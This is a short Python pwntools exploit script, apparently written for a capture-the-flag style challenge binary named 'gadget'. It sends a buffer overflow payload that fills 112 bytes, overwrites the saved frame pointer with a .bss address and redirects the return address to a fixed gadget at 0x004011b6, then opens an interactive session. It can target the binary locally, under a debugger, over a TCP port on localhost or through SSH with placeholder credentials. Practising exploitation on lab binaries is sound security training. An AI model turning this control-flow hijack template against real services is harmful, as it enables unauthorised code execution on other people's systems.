#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e'] # replace this with your terminal of choice
#context.log_level = 'debug'
context.binary = './build/gadget'

e = ELF('./build/gadget')
rop = ROP('./build/gadget')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('localhost', 5000)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/gadget', cwd='problemDir')
else:
    p = e.process()

payload = flat({112: e.bss()}, p64(0x004011b6))

p.sendline(payload)
p.interactive()
